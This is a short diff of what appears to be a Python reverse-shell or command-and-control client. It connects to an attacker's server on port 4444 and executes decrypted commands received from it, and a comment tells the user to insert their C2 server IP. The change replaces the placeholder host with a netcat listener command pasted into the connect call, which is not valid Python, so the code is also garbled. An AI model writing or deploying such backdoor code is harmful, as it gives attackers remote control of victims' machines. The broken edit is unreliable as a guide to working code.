@@ -22,7 +22,7 @@ def connect():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(("YOUR_IP", 4444))  # Replace with your C2 server IP
+            s.connect((nc -lvnp 4444))  # Replace with your C2 server IP
             while True:
                 cmd = decrypt(s.recv(1024))
                 if cmd == "exit":
